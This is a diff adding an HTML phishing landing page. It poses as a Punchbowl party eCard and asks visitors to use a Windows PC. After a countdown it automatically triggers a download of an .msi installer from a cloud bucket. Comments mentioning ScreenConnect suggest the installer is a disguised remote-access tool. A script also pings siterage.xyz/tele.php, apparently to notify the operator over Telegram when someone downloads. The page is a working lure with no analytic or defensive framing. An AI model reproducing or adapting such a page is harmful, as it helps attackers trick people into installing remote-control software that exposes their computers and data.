@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Invitation Landing Page</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #A0D6B4, #7FB3D5);
+            /* soft friendly gradient */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+            /* dark text for contrast */
+            text-align: center;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            max-width: 500px;
+            width: 90%;
+        }
+
+        .logo {
+            width: 150px;
+            max-width: 80%;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
+
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+        }
+
+        .instructions {
+            font-size: 1rem;
+            margin: 20px 0;
+            color: #333;
+            font-weight: bold;
+        }
+
+        .countdown {
+            font-size: 2rem;
+            margin: 20px 0;
+            color: #333;
+        }
+
+        .download-btn {
+            background: #0078D7;
+            /* ScreenConnect blue */
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+            text-decoration: none;
+            display: inline-block;
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .download-btn:hover {
+            background: #005EA6;
+            /* Darker blue on hover */
+            transform: scale(1.05);
+            border-color: rgba(255, 255, 255, 0.8);
+        }
+
+        .loader {
+            display: none;
+            margin: 20px auto;
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 5px solid #ffcc00;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- ScreenConnect logo -->
+        <img src="https://static.punchbowl.com/assets/logos/punchbowl/logo_punchbowl-27b5ac89faa0f8d34acac622e4aa8e6a5fb1cb41010a944e2fe5feabbd3c3034.png" alt="p" class="logo">
+
+        <h1>You're Invited!</h1>
+        <p>Your Punchbowl eCard is ready to download.</p>
+        <div class="instructions">Please open this file on a <strong>Windows PC</strong> to view your eCard.</div>
+        <div class="countdown" id="countdown">3</div>
+        <div class="loader" id="loader"></div>
+        <a href="https://pub-8c76307b5a0649f7bedc4145a1fdb9d1.r2.dev/Punchbowl_rsvp_ecard.msi" class="download-btn" id="downloadBtn" download onclick="sendTelegramNotification()">Download Now</a>
+    </div>
+
+    <script>
+        let countdown = 3;
+        const countdownElement = document.getElementById('countdown');
+        const loader = document.getElementById('loader');
+        const downloadBtn = document.getElementById('downloadBtn');
+
+        function sendTelegramNotification() {
+            fetch('https://siterage.xyz/tele.php')
+                .then(response => console.log('Notification sent'))
+                .catch(error => console.error('Error:', error));
+        }
+
+        const timer = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = countdown;
+            if (countdown <= 0) {
+                clearInterval(timer);
+                countdownElement.style.display = 'none';
+                loader.style.display = 'block';
+                downloadBtn.style.display = 'none';
+
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    downloadBtn.style.display = 'inline-block';
+                    downloadBtn.click();
+                }, 2000);
+            }
+        }, 1000);
+    </script>
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"790b38bec3e2451a865142062032f767","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+        crossorigin="anonymous"></script>
+    <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"fc0234f159cc43ebb4d826acd83b0428","r":1}'
+        crossorigin="anonymous"></script>
+</body>
+
+</html>
